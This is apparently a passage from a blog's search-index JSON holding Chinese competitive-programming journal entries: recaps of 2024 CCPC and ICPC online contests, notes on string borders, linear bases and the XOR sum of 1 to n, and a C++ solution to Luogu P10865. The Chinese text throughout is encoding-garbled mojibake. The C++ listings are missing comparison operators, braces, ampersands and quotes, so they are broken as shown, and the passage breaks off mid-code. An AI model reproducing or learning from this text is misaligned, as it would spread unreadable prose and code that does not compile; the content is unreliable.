‘ä¸­ï¼Œç„¶åå°±å¯ä»¥åŒºé—´æŸ¥è¯¢å¾—å‡ºç­”æ¡ˆäº†ã€‚ ç”±äºä¸å¤ªä¼šå­—ç¬¦ä¸²ï¼Œè‡ªç„¶ä¹Ÿä¸æ‡‚ $\\texttt{border}$ çš„åŸç†ï¼Œäºæ˜¯æ¶è¡¥ä¸€ä¸‹ã€‚ ç®€å•æ¥è¯´ï¼Œè‹¥ $s$ çš„ä¸€ä¸ªå­ä¸²ï¼ˆéåŸä¸²ï¼‰æ—¢æ˜¯å®ƒçš„å‰ç¼€åˆæ˜¯å®ƒçš„åç¼€ï¼Œåˆ™è¿™ä¸ªå­ä¸²æ˜¯å®ƒçš„ $\\texttt{border}$ã€‚è‹¥ $s[1,p] = s[|s| - p + 1,p]$ï¼Œåˆ™ $s[1,p]$ ä¸º $\\texttt{border}$ï¼Œå¯ä»¥æ¨å‡º $|s| - p$ æ˜¯ $s$ çš„å‘¨æœŸã€‚è¯æ˜å¦‚ä¸‹ï¼š è‹¥ä¸€ä¸ªå­—ç¬¦ä¸²å‘¨æœŸä¸º $p$ï¼Œåˆ™ $\\forall x |s| - p$ï¼Œæœ‰ $s[x + p] = s[x]$ã€‚é‚£ä¹ˆè®¾ $t$ ä¸º $s$ çš„ $\\texttt{border}$ æ‰€å¯¹åº”çš„é•¿åº¦ï¼Œåˆ™ $\\forall x \\le t$ï¼Œ$s[x + (|s| - x)] = s[x]$ï¼Œå˜å½¢å¯å¾—ï¼Œ$\\forall x \\le |s| - (|s| - t)$ï¼Œ$s[x + (|s| - t)] = s[x]$ï¼Œç¬¦åˆå‘¨æœŸå®šä¹‰ã€‚ MD è¿™æäº¤äº†å°†è¿‘ $20$ æ¬¡ï¼ŒåŸæ¥ s = ch + s ä¹Ÿä¼šå¯¼è‡´è¶…æ—¶ï¼Œä½†æ˜¯ WA åˆæ˜¯æ€ä¹ˆå›äº‹ï¼Ÿï¼Ÿï¼Ÿæ”¹æˆåŒå“ˆå¸Œä¹ŸæŒ‚ï¼Œå–æ¨¡åˆä¼šè¶…æ—¶ï¼Ÿï¼Ÿï¼Ÿè¦çº¢æ¸©äº†ï¼ï¼ï¼ï¼ï¼ï¼ $2024.09.07$ ç½‘ç»œé¢„é€‰çƒ­èº«èµ›æµ‹è¯•è®¾å¤‡ï¼Œä¼¼ä¹éƒ½æ²¡å•¥é—®é¢˜ï¼Œå¸Œæœ›æ˜å¤©ä¸è¦å‡ºé”…ã€‚ æ€»çš„æ¥è¯´ï¼Œæ‰“å¾—å¹¶ä¸å¥½ã€‚çƒ­èº«èµ›ä¸€å…±åªæœ‰ä¸‰é“é¢˜ï¼Œé˜Ÿå‹å…ˆæƒ³äº†ç¬¬ä¸‰é¢˜ä½†æ˜¯å‡ºé”…äº†å¯¼è‡´ç¬¬äºŒé¢˜åœ¨å°†è¿‘æ¯”èµ›ç»“æŸçš„æ—¶å€™æ‰è¿‡ï¼Œè¿˜å› ä¸ºç¥å¿…é”™è¯¯æŒ‚äº†ä¸¤æ¬¡ï¼Œå› æ­¤æ’åå¾ˆé åã€‚å“ä¸æ˜¯ä»Šå¤©æ€ä¹ˆéƒ½æ˜¯æˆ‘åœ¨è¿‡é¢˜ï¼Œäººéº»äº†â€¦â€¦ $A$ å°±æ˜¯ä¸€ä¸ªæœç´¢ï¼Œéœ€è¦è®¡ç®—å‡ºå½¢å¦‚ $1,0,8$ è¿™ç§ # å†…éƒ¨æœ‰ $0,1,2$ ä¸ªæ´ï¼ˆç”¨ .ï¼‰çš„ä¸ªæ•°ã€‚æ²¡å•¥å¥½è¯´ï¼Œä¸åœ $\\texttt{dfs}$ å»å¤„ç†å°±å¥½äº†ï¼Œå¾ˆå¿«å†™å®Œï¼Œä¸€å‘è¿‡ã€‚ $C$ æ˜¯å…ˆå†™çš„ï¼Œä½†æ˜¯å› ä¸ºé¢˜ç›®æè¿°ä¸æ¸…ï¼Œå£èƒ¡è¿‡äºç²—ç³™ç­‰åŸå› å†™äº†å¥½ä¹…ä½†æ˜¯ WAã€‚ $B$ å°±æ˜¯ç»™ $num_i$ ä¸ª $i(i \\in [0,9])$ï¼Œç„¶åä»ä¸­å– $m$ ä¸ªä½¿å¾—ç»„æˆçš„æ•°æœ€å°ã€‚éš¾ç‚¹åœ¨äºå¦‚ä½•åœ¨æ„é€ å¤§æ•°çš„åŒæ—¶å–æ¨¡ã€‚æˆ‘çš„æƒ³æ³•æ˜¯ä»¤ $f_{i,j}$ è¡¨ç¤ºæœ‰ $2^{j - 1}$ ä¸ªæ•°å­— $i$ æ—¶å–æ¨¡çš„å€¼ï¼Œå¯ä»¥åˆ—å‡ºé€’æ¨å¼ï¼Œ$f_{i,j} = f_{i,j - 1} \\times 10^{2^{j - 2}} + f_{i,j - 1}$ã€‚åœ¨æ„é€ çš„æ—¶å€™éœ€è¦ç‰¹æ®Šå¤„ç†æœ€é«˜ä½ï¼ˆå½“ç„¶ä¹Ÿå°±è¦ç‰¹åˆ¤ $m = 1$ ç­”æ¡ˆä¸º $0$ çš„æƒ…å†µï¼‰ï¼Œç„¶åæŒ‰ç…§è¿›åˆ¶ä¸ºå€’åºå¾ªç¯ $30 \\to 1$ï¼Œè®¡ç®—å³å¯ã€‚å½“ç„¶ï¼Œèµ›åè®²é¢˜å‘ç°æœ‰ç§æ›´æ˜¾ç„¶çš„åšæ³•ï¼Œå°±æ˜¯ $99 \\cdots 9 = 10^k - 1$ï¼Œå¥½å¥½å¥½ï¼Œè¦ç ´é˜²äº†â€¦â€¦è¿™é¢˜çš„é”…è¿˜æ˜¯é˜Ÿå‹æ£€æŸ¥ï¼ˆä¸€çœ¼ï¼‰å‡ºæ¥çš„ï¼Œç”±æ­¤å¯è§å›¢é˜Ÿåˆä½œçš„é‡è¦æ€§ï¼ï¼ˆæˆ‘è‡ªå·±æ£€æŸ¥ $15$ åˆ†é’Ÿæ­»æ´»æ²¡çœ‹å‡ºæ¥ï¼‰ $D$ åº”è¯¥å°±æ²¡å°è¯•è¿‡ï¼Œæ‰€ä»¥å°±å…ˆä¸è¯´äº†ã€‚ æ˜å¤©åŠ æ²¹ï¼ $2024.09.07$ CCPC ç½‘ç»œé¢„é€‰çœæµï¼šåšé¢˜ä¸åœ¨çŠ¶æ€ï¼Œåšå‡º $5$ é¢˜ï¼Œæ‰“æˆå±äº†ã€‚ å› ä¸ºç½‘ç»œé—®é¢˜è¿˜å»¶é•¿äº† $1$ å°æ—¶ï¼Œä½†æ€»å½’è¿˜æœ‰ç‚¹å½±å“ã€‚ å¾ˆå¿«åœ°æ‰“å®Œäº† $B,L$ ç­¾åˆ°ï¼Œè¿˜è¢« $B$ æ‰€æœ‰æ•°éƒ½ä¸€æ ·çš„æƒ…å†µç»™æ¶å¿ƒäº†ä¸€å‘ã€‚ç„¶åæˆ‘å¼€å§‹å¼€ $K$ï¼Œæƒ³åˆ°äº†ä¸€ç§è‡ªå·±è®¤ä¸ºå¾ˆå¯¹çš„ç®—æ³•ï¼Œæ²¡æ€ä¹ˆå’Œé˜Ÿå‹è®¨è®ºå°±äº¤äº†ï¼Œè¿˜ WA äº†ä¸¤æ¬¡æ‰å‘ç°å‡ï¼Œå¥½åœ¨å’Œé˜Ÿå‹è®¨è®ºäº†ä¸€ä¸‹é†’æ‚Ÿäº†è¿‡æ¥ï¼Œæœ€ååœ¨ä¸€å¤§å †åˆ†ç±»è®¨è®ºä¸­è¿‡äº†è¿™é¢˜ã€‚èµ›åå‘ç°åªéœ€è¦è€ƒè™‘ lowbit(n) ä¸ $k$ çš„å¤§å°å³å¯ã€‚ ç„¶åå°±åˆ°äº†æœ¬åœºæ¯”èµ›é—®é¢˜æœ€å¤§çš„ $D,E$ï¼Œ$E$ çº¯é é˜Ÿå‹å¼€é¢˜ï¼Œç„¶åä¸€ç›´å¤„äºä¸€ç§æƒ³åˆ°äº†ç„¶åå‘ç°å‡äº†/å¤æ‚åº¦è¶…äº†çš„æƒ…å†µï¼Œè€Œä¸”è¿˜æœ‰ä¸¤ä¸ªå°é—®ã€‚ä¸€ç›´åˆ°äº† $3.5$ å°æ—¶å·¦å³æ‰è¿‡è¿™é¢˜ã€‚ $D$ é¢˜ä¸çŸ¥å’‹çš„æˆ‘ä»¬ä¸‰ä¸ªéƒ½æ— æ€è·¯ï¼Œå´å‘ç°æ¦œä¸Šä¸€å¤§å †çš„äººè¿‡äº†ï¼Œäºæ˜¯æˆ‘ä»¬éƒ½å¼€å§‹æ…Œäº†ã€‚ç›´åˆ°æˆ‘æ— æ„å‘ç°æ—¶é—´é™åˆ¶æ˜¯ $2$ ç§’ï¼Œæ‰é†’æ‚ŸåŸæ¥æœ´ç´ çš„åŒºé—´ $DP$ å°±å¯è¿‡ï¼Œç„¶åæ‰å¼€å†™ï¼ŒæœŸé—´é˜Ÿå‹å†™çº¢æ¸©äº†ï¼Œè¿˜æ¢äº†ä¸ªäººæ¥é‡æ„ï¼Œæ€»ä¹‹åœ¨ $5$ å°æ—¶çš„æ—¶å€™æ‰è¿‡ï¼Œè€Œä¸”è¿˜å› ä¸ºåˆå§‹åŒ–é—®é¢˜ WA äº†ä¸¤æ¬¡ã€‚ $J$ æƒ³äº†ï¼Œé¢˜æ„é¡ºåˆ©è½¬æ¢äº†ï¼Œä½†æ˜¯çº¿æ€§åŸºä¸ä¼šï¼Œæ‰€ä»¥æ²¡æ³•å†™ã€‚$I$ æƒ³äº†ï¼Œä½†æ˜¯å¾ˆå¤æ‚ï¼Œå…ˆæ˜¯ $O(n^4)$ çš„ç®—æ³•ï¼Œç„¶åé˜Ÿå‹ç”¨ä¸€ç§æˆ‘æ²¡æ€ä¹ˆç†è§£çš„ç®—æ³•å†™äº†ï¼Œä¸è¿‡åˆ°ç»“æŸä¹Ÿæ²¡æœ‰æˆåŠŸè°ƒå‡ºæ¥ï¼ˆæ‚²ï¼‰ã€‚ èµ›åä¸€é¡¿åæ€ã€å¤ç›˜â€¦â€¦ ç¬¬äºŒå¤©å¼€å§‹è¡¥é¢˜ï¼Œå—¯å“¼è¿™ä¸ª $D$ æ€ä¹ˆè¿™ä¹ˆç®€å•ï¼Ÿå—¯å“¼è¿™ä¸ª $C$ æ€ä¹ˆæ²¡çœ‹è¿‡é¢˜ï¼Œä½†æ˜¯è¿™ä¹ˆå¯åšï¼Ÿ$I$ æƒ³åˆ°äº†ä¸€ç§ç®€å•åšæ³•ï¼Œé‚£å°±å®ç°ä¸€ä¸‹ï¼Ÿ æšä¸¾æœ€çŸ­æ—¶é—´ $t$ï¼Œå¯¹äºä¸€ä¸ªçœŸå®å­˜åœ¨çš„ $t$ï¼ˆå¯ä»¥é€šè¿‡é¢„å¤„ç†è®°å½•ï¼‰ã€‚è®¾ $dp_{i,j}$ è¡¨ç¤ºå‰ $i$ ä¸ªäººæ‹¿äº† $j$ ä¸ªè¡Œæçš„æ–¹æ¡ˆæ•°ï¼ˆæ³¨æ„å¯¹ç­”æ¡ˆçš„è´¡çŒ®è¿˜è¦ä¹˜ä¸Š $t$ï¼Œæˆ‘å°±æ˜¯è¿™é‡Œè¢«å¡äº†å¾ˆä¹…å¾ˆä¹…ï¼‰ã€‚ç”±äºæšä¸¾çš„æ˜¯æœ€çŸ­æ—¶é—´ $t$ï¼Œå°±éœ€è¦è¿™ä¸ªæ—¶é—´ $t$ ä¸€å®šå¾—å–åˆ°ï¼Œå¯¹äºä¸€ä¸ªäººé€‰æ‹©è¡Œæçš„åæ ‡èŒƒå›´ä¸º $[1,x - t]$ï¼ˆ$x$ è¡¨ç¤ºå½“å‰çš„äººæ‰€åœ¨çš„åæ ‡ï¼Œç”±äºç›´æ¥è½¬ç§»å¯èƒ½ä¼šå› ä¸º $x - t$ éƒ½æœªå–åˆ°è€Œå¯¼è‡´é”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¸¤æ¬¡ dpï¼Œåˆ†åˆ«å¤„ç† $[1,x - t]$ å’Œ $[1,x - t - 1]$ çš„æƒ…å†µï¼Œä½œå·®å¾—åˆ°ç­”æ¡ˆã€‚ è½¬ç§»æ–¹ç¨‹ï¼ˆåªå†™å‡ºä¸€ä¸ªï¼Œå…¶ä¸­ $sum_i$ è¡¨ç¤ºåæ ‡ä¸Š $[1,i]$ çš„è¡Œææ•°ï¼‰ï¼š \\begin{cases} dp_{0,0} = 1\\\\ dp_{i,j} = dp_{i,j}+dp_{i-1,j}\\\\ dp_{i,j + 1} = dp_{i,j + 1}+dp_{i - 1,j} \\times \\max (0,sum_{\\max(0,b_i - t)} - j)\\\\ tot = tot+\\sum_{i = 1}^{\\min (n,m)} dp_{m,i} \\end{cases}æœ€åçš„ä»£ç å¦‚ä¸‹ï¼Œè¿˜è¢« codeforces çš„å¡å¸¸æ•´çº¢æ¸©äº†ã€‚ #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 998244353;inline int read ();int n,m,a[MAX],b[MAX],vis[MAX],sum[MAX];int dp[MAX][MAX],ans,tot1,tot2;//dp[i][j] å‰ i ä¸ªäººé€‰äº† j ä¸ªè¡Œæçš„æ–¹æ¡ˆæ•° int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) b[i] = read (); sort (a + 1,a + n + 1);sort (b + 1,b + 1 + m); for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) if (a[j] b[i]) vis[b[i] - a[j]] = 1; for (int i = 1;i = n;++i) ++sum[a[i]]; for (int i = 1;i = 500;++i) sum[i] += sum[i - 1]; for (int t = 0;t = 500;++t) if (!vis[t]) continue; tot1 = tot2,tot2 = 0; if (!tot1) for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) dp[i][j] = 0; dp[0][0] = 1; for (int i = 1;i = m;++i) for (int j = 0;j = min (m,sum[b[i]]);++j) dp[i][j] += dp[i - 1][j];dp[i][j] %= MOD; if (j + 1 = min (m,sum[b[i]])) dp[i][j + 1] += 1ll * dp[i - 1][j] * max (0,(sum[max (0,b[i] - t)] - j)) % MOD,dp[i][j + 1] %= MOD; for (int i = 1;i = min (n,m);++i) tot1 = (tot1 + dp[m][i]) % MOD; for (int i = 1;i = m;++i) for (int j = 1;j = n;++j) dp[i][j] = 0; dp[0][0] = 1; for (int i = 1;i = m;++i) for (int j = 0;j = min (m,sum[b[i]]);++j) dp[i][j] += dp[i - 1][j];dp[i][j] %= MOD; if (j + 1 = min (m,sum[b[i]])) dp[i][j + 1] += 1ll * dp[i - 1][j] * max (0,(sum[max (0,b[i] - t - 1)] - j)) % MOD,dp[i][j + 1] %= MOD; for (int i = 1;i = min (n,m);++i) tot2 = (tot2 + dp[m][i]) % MOD; ans += 1ll * (tot1 - tot2 + MOD) * t % MOD;ans %= MOD; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; å¼€å§‹æ¶è¡¥çº¿æ€§åŸºï¼Œçœ‹çš„æ˜¯è¿™ä¸ª æ´›è°·æ—¥æŠ¥ã€‚ ç®€å•æ¥è¯´ï¼Œçº¿æ€§åŸºæ˜¯ä¸€ä¸ªé›†åˆï¼Œå–çº¿æ€§åŸºä¸­è‹¥å¹²ä¸ªæ•°å¼‚æˆ–èµ·æ¥å¯ä»¥å¾—åˆ°åŸåºåˆ—ä¸­çš„ä»»ä½•ä¸€ä¸ªæ•°ã€‚é‚£ä¹ˆå¦‚æœè¦æ’å…¥ä¸€ä¸ªæ•° $x$ï¼Œåªéœ€è¦åˆ¤æ–­ $x$ åœ¨äºŒè¿›åˆ¶ä¸‹çš„æ¯ä¸€ä½é $0$ ä½åœ¨çº¿æ€§åŸºä¸­æ˜¯å¦å­˜åœ¨ã€‚ for (int i = 60;~i;--i) if (!((1ll i) x)) continue; if (!p[i]) x^= p[i]; else p[i] = x; æ±‚åºåˆ—ä¸­é€‰è‹¥å¹²ä¸ªæ•°å¼‚æˆ–çš„æœ€å¤§å€¼ï¼Œåªéœ€è¦åœ¨æ±‚å‡ºçº¿æ€§åŸºçš„åŸºç¡€ä¸Šä»é«˜åˆ°ä½è´ªå¿ƒçœ‹æ˜¯å¦éœ€è¦å¼‚æˆ–ä¸Š $p_i$ å³å¯ã€‚ æ±‚åºåˆ—ä¸­é€‰è‹¥å¹²ä¸ªæ•°å¼‚æˆ–çš„æœ€å°å€¼ï¼Œè‹¥æœ‰å…ƒç´ æ— æ³•æ’å…¥çº¿æ€§åŸºï¼Œåˆ™ç­”æ¡ˆä¸º $0$ï¼Œå¦åˆ™ä¸ºæœ€å°çš„ $p_i$ã€‚ åŒæ ·çš„ï¼ŒI é¢˜ç»è¿‡é¢˜æ„è½¬åŒ–åå°±æ˜¯åœ¨ç»´æŠ¤å‡º $c_i = a_i \\oplus b_i$ çš„çº¿æ€§åŸºåæŒ‰é«˜åˆ°ä½è´ªå¿ƒå»æ›´æ–°å³å¯ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š for (int i = 1;i = n;++i) int x = a[i] ^ b[i]; for (int i = 30;~i;--i) if (!((1 i) x)) continue; if (!p[i]) p[i] = x;break; else x ^= p[i]; for (int i = 30;~i;--i) if (max (suma,sumb) max (suma ^ p[i],sumb ^ p[i])) suma ^= p[i],sumb ^= p[i]; ä¸å†™ C é¢˜çœŸçš„åæ‚”ä¸€ä¸‡å¹´ã€‚è´ªå¿ƒçš„æ€è·¯ï¼Œä»ä¸‹å¾€ä¸Šï¼Œå¦‚æœæœªé‡åˆ°å·²ç§æ¤çš„ç‚¹ï¼Œé‚£å°±å°†å­æ ‘å¤§å°å‘ä¸Šä¼ ï¼›å¦åˆ™ä»¥å®ƒä¸ºæ ¹å¤„ç†å…¶å­æ ‘å†…çš„ç‚¹ã€‚å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä»¥æŸç‚¹ä¸ºæ ¹å¤„ç†æ—¶ï¼Œå¯èƒ½ä¼šæœ‰å¤šä½™çš„ç‚¹å¯ä»¥å‘ä¸Šä¼ é€’è‡³å®ƒçš„çˆ¶äº²ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š void dfs (int u,int fa) sz[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs (v,u); sz[u] += sz[v]; if (vis[u]) ans += max (sz[u] / 2,0); if (sz[u] % 2 == 0) vis[fa] = 1;//æœ‰å¤šä½™ï¼Œå‘ä¸Šä¼ é€’è‡³çˆ¶äº²èŠ‚ç‚¹ sz[u] = 0;//è¯¥å­æ ‘å†…å…¨éƒ¨å¤„ç†å®Œ else if (u == 1) ans += max ((sz[u] + 1) / 2,0);//ç‰¹åˆ¤å‘ä¸Šä¸€ç›´å†æ— é‡åˆ° vis[i] = 1 çš„ç‚¹ 2024.09.15 ICPC ç½‘ç»œèµ›â… ç¬‘æ­»ï¼Œé˜Ÿé•¿æŠ¥ååªå†™äº†ä»–ä¸€ä¸ªäººã€‚äºæ˜¯ä¹ï¼Œè¿™åœºæ²¡æ‰“â€¦ ä½†èµ›åå‘ç°è¿™åœºä¼¼ä¹æŒºéš¾ï¼Œé‚£å°±è¿˜å¥½ï¼ 2024.09.21 ICPC ç½‘ç»œèµ›â…¡è¿™åœºæ‰“åœ°å¾ˆé¡ºï¼Œå¼€åœºåŠå°æ—¶è¿‡å®Œ F,J,A ç­¾åˆ°ã€‚ç„¶åé˜Ÿå‹å¼€ I æ„é€ é¢˜ï¼Œæ˜¾ç„¶å¯ä»¥ç”¨é«˜ä½å¼¥è¡¥ä½ä½å‡‘å‡ºè§£ï¼Œåˆå…‰é€Ÿå‘ç°æœ«ä½ä¸º $00$ æ—¶æ˜¯æ— è§£çš„æƒ…å†µï¼Œäºæ˜¯åšå®Œäº†ã€‚ç„¶è€Œï¼Œé˜Ÿå‹å› ä¸ºè¾“å‡ºåäº†æŒ‚äº†ä¸€å‘ã€‚ ç„¶åå’Œé˜Ÿå‹å¼€å§‹åš $L$ï¼Œä¸€å¼€å§‹æé”™é¢˜æ„ä»¥ä¸ºåªèƒ½æœ€å¤š refresh æ“ä½œä¸€æ¬¡ï¼ŒWA äº†ä¸¤å‘ä»¥åæˆ‘ç›´æ¥é«˜ä¸­åˆ—è¡¨æ³•æ±‚æœŸæœ›ä½†è¯¯ä»¥ä¸ºä¸´ç•Œç‚¹ $t$ åœ¨ $\\lfloor\\frac{n}{2}\\rfloor + 1$ã€‚ $1$ $2$ $\\cdots$ $t$ $E(x) + 1$ $P$ $\\frac{1}{n}$ $\\frac{1}{n}$ $\\dots$ $\\frac{1}{n}$ $\\frac{n - t}{n}$ æ±‚å¾— $E(x) = \\frac{t ^ 2 - t + 2n}{2t}$ã€‚WA äº†ä¸€å‘åé˜Ÿå‹é€šè¿‡è§£ä¸ç­‰å¼ä»¥åè¿‡äº†è¿™é¢˜ã€‚ æ¥ç€å¼€ Gï¼Œæ€ä¹ˆåˆæ˜¯æ¨å¼å­ï¼Œç„¶åå‘ç°å¹³å±€å•¥ç”¨æ²¡æœ‰ã€‚ æˆ‘è¿™æ—¶å€™å¼€å§‹è¯» Eï¼Œå†—é•¿çš„é¢˜é¢ï¼Œä»¥ä¸ºæ˜¯ä¸å¯åšé¢˜ã€‚ç„¶åç»™é˜Ÿå‹ç¿»è¯‘äº†ä¸€ä¸‹ï¼Œéšå£è¯´äº†ä¸€å¥å¥‡å¶æ€§åˆ†å±‚å›¾ï¼Œç»“æœè¢«ä»–ç»™ç§’äº†ï¼Œåœ¨æ­¤è†œæ‹œã€‚ å¥½äº†ä¸ƒé¢˜äº†ï¼Œä¹‹åå°è¯•äº†å‡ é¢˜å…¨éƒ½æ— æœï¼ˆæˆ‘ç”šè‡³è¿˜å°è¯•æ•°æ®ç»“æ„æ¥ç€ï¼Œç¬‘æ­»è¿™é¢˜åªæœ‰ä¸€ä¸ªé˜Ÿé€šè¿‡ï¼‰ï¼Œä¸€å°æ—¶åç‰¢ï¼Œæœ€åå–œææ ¡ $\\texttt{rk 3}$ã€‚ ç”±äºæœ¬äººå‰ä¸€å¤©è„‘æŠ½æ‰“äº†ä¸€åœºæ‰åˆ†è¿‘ $100$ çš„ CFï¼Œæ‰€ä»¥è¯´åˆå…‰æ˜æ­£å¤§åœ°æ°´äº†è¿™åœºæ¯”èµ›ï¼Œå…¨é é˜Ÿå‹ï¼ï¼ï¼ 2024.xx.xx é€‰èµ›ç«™é€‰äº† $2024.11.2-11.3$ çš„ $\\texttt{ICPC}$ å—äº¬ç«™ å’Œ $2024.11.9-11.10$ çš„ $\\texttt{CCPC}$ é‡åº†ç«™ã€‚åŠ æ²¹å§ï¼Œäº‰å–æ‹¿ç‰Œï¼ 2024.11.2-11.3 ICPC å—äº¬è¯¦è§ æ¸¸è®°â€”ICPC å°ç™½å‹‡é—¯å—äº¬ã€‚ 2024.11.9-11.10 CCPC é‡åº†$5$ é¢˜é“äº†ï¼Œé‚£é“æ„é€ å›å»ç»™å®¤å‹è®²é¢˜çš„æ—¶å€™çªç„¶é¡¿æ‚Ÿï¼Œå¯æƒœæ™šäº†â€¦â€¦æ‰“çš„å¤ªçƒ‚å°±ä¸å†™æ¸¸è®°äº†ã€‚ ä¸€äº›å¥½æ–‡ï¼Œç•™ç€çœ‹ï¼š Some Simple Tricks ä¸€äº› trick","categories":["Journal"]},{"title":"æ±‚ $[1,n]$ çš„å¼‚æˆ–å’Œ","path":"/2024/08/13/XOR/","content":"éƒ¨åˆ†å‚è€ƒ æ­¤å¤„ã€‚ é€šè¿‡æ‰“è¡¨å¯ä»¥æ‰¾åˆ°è§„å¾‹ï¼Œç»™å‡ºç»“è®ºï¼š \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} n \\ (n \\equiv 0 \\bmod 4)\\\\ 1 \\ (n \\equiv 1 \\bmod 4)\\\\ n + 1 \\ (n \\equiv 2 \\bmod 4)\\\\ 0 \\ (n \\equiv 3 \\bmod 4) \\end{aligned} \\right.è®¾ $f(l,r)$ è¡¨ç¤ºåŒºé—´ $[l,r]$ çš„å¼‚æˆ–å’Œã€‚ç”±äº$f(2^k,2^{k + 1} - 1)$ ä¸­çš„æœ€é«˜ä½å‡ºç° $2^k$ æ¬¡ï¼Œåˆ™ç”± $2^k \\equiv 0 \\bmod 2$ å¯çŸ¥ $f(2^k,2^{k + 1} - 1) = f(1,2^k - 1)$ï¼Œæ‰€ä»¥è¯´å¯ä»¥å¾—åˆ°ï¼š f (1,2^{k + 1} - 1) = f (1,2^k - 1) \\oplus f (2^k,2^{k + 1} - 1) = 0å¯¹äº $k \\ge 2$ æ—¶ï¼Œè¦æ±‚ $f(1,n)$ æ—¶ï¼Œè‹¥æœ€é«˜ä½ä¸º $2^k$ï¼Œåˆ™ $f (1,n) = f(1,2^k - 1) \\oplus f (2^k,n) = f(2^k,n)$ã€‚è®¾ $p = n - 2^k + 1$ï¼Œåˆ™æœ‰ï¼š $p \\equiv 0 \\bmod 2$\\$f (2^k,n) = f(1,n - 2^k)$ï¼Œåˆå› ä¸º $n - 2^k$ ä¸ $n$ åŒå¥‡å¶ï¼Œæ•…ç”±äº $k \\ge 2$ï¼Œ$f (1,n)$ çš„å€¼å–å†³äºå°äº $4$ çš„éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} 1 \\ (n \\equiv 1 \\bmod 4)\\\\ 0 \\ (n \\equiv 3 \\bmod 4) \\end{aligned} \\right. $p \\equiv 1 \\bmod 2$\\åŒç†å¯çŸ¥æœ€é«˜ä½å¯ä»¥ä¿ç•™ï¼ŒåŒæ—¶ $f (1,n)$ çš„å€¼ä¹Ÿå–å†³äºå°äº $4$ çš„éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š \\oplus_{i = 1}^{n} i =\\left\\{ \\begin{aligned} n \\ (n \\equiv 0 \\bmod 4)\\\\ n + 1 \\ (n \\equiv 2 \\bmod 4)\\\\ \\end{aligned} \\right.","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼šP10865 [HBCPC2024] Genshin Impact Startup Forbidden III","path":"/2024/08/11/P10865/","content":"ä¸€ä¸ªä½ç½®æœ€å¤šåªæœ‰ $3$ æ¡é±¼ï¼Œè€Œæ‰€æœ‰æœ‰é±¼çš„æ ¼å­ä¸è¶…è¿‡ $10$ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ª $4$ è¿›åˆ¶çš„çŠ¶æ€å‹ç¼©ã€‚è®¾ $dp_s$ è¡¨ç¤º $k$ ä¸ªæœ‰é±¼çš„æ ¼å­ä¸­å—åˆ°ç‚¸å¼¹å½±å“åçš„çŠ¶æ€ä¸º $s$ æ—¶æ‰€éœ€è¦çš„æœ€å°çš„ç‚¸å¼¹çš„æ•°é‡ã€‚ åŒæ—¶ï¼Œç”±äºä¸€ä¸ªç‚¸å¼¹åªèƒ½å½±å“åˆ°äº”ä¸ªæ ¼å­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é¢„å¤„ç†å‡ºä¸è¶…è¿‡ $50$ ä¸ªå¯èƒ½ä¼šæ”¾ç‚¸å¼¹çš„ä½ç½®ã€‚å½“çŠ¶æ€ä¸º $s$ æ—¶ï¼Œåœ¨æŸå¤„æ”¾å…¥ä¸€ä¸ªç‚¸å¼¹ï¼Œæˆ‘ä»¬å¯ä»¥å°† $s$ æ¯ä¸€ä½åˆ†ç¦»åï¼Œä¿®æ”¹ç‚¸å¼¹å½±å“åˆ°çš„é‚£äº›ä½ç½®ï¼Œç„¶åå†é‡æ–°è·å¾— $sâ€™$ã€‚å› æ­¤å¯ä»¥åˆ—å‡ºè½¬ç§»æ–¹ç¨‹ $dp_{sâ€™} = \\min (dp_{sâ€™},dp_s + 1)$ã€‚ æœ€åçš„æ—¶é—´å¤æ‚åº¦çº¦ä¸º $O(4^k \\times k^2)$ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,k,p,tot,v[15],dp[MAX],sx[] = 0,1,-1,0,0,sy[] = 0,0,0,1,-1;vector int tmp;set pair int,int loc;map pair int,int,int id;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();k = read (); for (int i = 0;i k;++i) int x = read (),y = read ();v[i] = read (); id[x,y] = i;//ç”¨ map è®°å½•ä¸‹å¯¹åº”çš„ä½ç½® for (int j = 0;j 5;++j) int xx = x + sx[j],yy = y + sy[j]; if (1 = xx xx = n 1 = yy yy = m) loc.insert (xx,yy);//é¢„å¤„ç†å‡ºç‚¸å¼¹å¯èƒ½æ”¾ç½®çš„ä½ç½®ï¼Œç”¨ set å»é‡ tot = tot * 4 + v[i];//å¤„ç†å‡ºå¯¹åº”çš„å››è¿›åˆ¶æ•° init (dp);dp[0] = 0; for (int i = 0;i = (1 (2 * k));++i) if (dp[i] == INF) continue; for (auto nxt : loc) int x = nxt.first,y = nxt.second; p = i;tmp.clear (); for (int j = 1;j = k;++j) tmp.push_back (p % 4),p /= 4;//é€ä½åˆ†ç¦» for (int j = 0;j 5;++j) int xx = x + sx[j],yy = y + sy[j]; if (id.find 